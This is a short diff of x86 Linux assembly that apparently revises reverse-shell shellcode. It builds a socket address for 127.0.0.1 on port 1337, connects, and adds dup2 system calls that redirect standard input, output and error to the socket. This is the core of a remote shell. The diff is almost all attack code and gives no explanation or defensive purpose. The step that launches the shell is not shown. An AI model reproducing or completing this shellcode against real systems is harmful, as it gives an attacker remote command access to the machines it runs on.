@@ -31,16 +31,19 @@ main:
     ;client.sin_port = htons(1234); 04d2
     ;client.sin_addr.s_addr = inet_addr("127.0.0.1");
     ;   31 32 37 2e 30 30 30 2e 30 30 2e 31 
+    
     push esi
-    push byte 0x31
-	push 0x2e302e20
+ ;   push byte 0x31
+	push 0x2e302e30     ; 127.0.0.1  , 0.0.0.0
 	push 0x2e373231
-    push word 0xd204    ;1337   1234=04d2
-    push 2
+    push word 0x3905  ;1337=0x3905   1234=04d2
+    push word 2
     mov ecx,esp 
     push 16 
     push ecx
     push edx 
+
+    mov ecx,esp
 
     int 0x80
 
@@ -50,15 +53,17 @@ main:
 
     mov al,63
     mov ebx,edx 
-    
-
     int 0x80
 
+
+    
+    mov al,63
     
     mov cl,1
     int 0x80
 
-   
+    
+    mov al,63
     mov cl,2
     int 0x80
 
